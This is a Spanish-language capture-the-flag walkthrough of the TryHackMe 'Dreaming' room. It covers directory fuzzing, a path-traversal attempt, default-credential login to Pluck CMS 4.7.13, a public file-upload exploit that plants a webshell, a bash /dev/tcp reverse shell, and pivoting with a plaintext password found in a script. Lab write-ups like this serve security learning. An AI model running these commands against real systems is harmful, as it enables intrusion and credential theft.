# Dreaming
- THM
- 10.130.178.56  y nmap -sCV -Pn 10.130.178.56
- 22 y 80 http
- ❯ ffuf -u http://10.130.178.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt para ver que rutas hay en la web.
- encuentro con ❯ ffuf -u http://10.130.178.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -> /app 301 redirigido permanentemente y index.html
- EN app encuentro -> pluck-4.7.13/	2020-01-29 08:55 	-> http://10.130.178.56/app/pluck-4.7.13/?file=dreaming -> pruebo pero lo bloquea -> http://10.130.178.56/app/pluck-4.7.13/?file=../../../../etc/passwd
- ❯ ffuf -u http://10.130.178.56/app/pluck-4.7.13/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -> admin.php, data , docs, files, images,index.php, robots.txt
- pluckcms common passwords para probar en el panel http://10.130.178.56/app/pluck-4.7.13/login.php -> admin, password (correcta)
- Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) CVE-2020-29607-Exploit
- python3 49909.py 10.130.178.56 80 password /app/pluck-4.7.13 -> ip , contraseña ,ruta donde está instalado Pluck CMS
- Authentification was succesfull, uploading webshell -> Uploaded Webshell to: http://10.130.178.56:80/app/pluck-4.7.13/files/shell.phar
- http://10.130.178.56:80/app/pluck-4.7.13/files/shell.phar accedemos y tenemos una shell -> p0wny@shell:â¦/pluck-4.7.13/files# whoami www-data
- nc -lvnp 4444 -> bash -c 'bash -i >& /dev/tcp/192.168.132.185/4444 0>&1' y nos enviamos la shell.
- script /dev/null -c bash + ctrl z + stty raw -echo; fg -> reset export TERM=xterm export SHELL=bash stty rows 40 columns 120 y listo :) a operar.
- death  lucien  morpheus  ubuntu vemos estos usuarios
- Busco por contraseñas en cada directorio personal y demás no enucentro nada procedo a enumerar mas cosas
- y en directorio opt veo -> -rwxr-xr-x  1 lucien lucien  483 Aug  7  2023 test.py -> password = "HeyLucien#@1999!"

- # MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

- su lucien y cambiamos de user con la pw pillada.-
- 
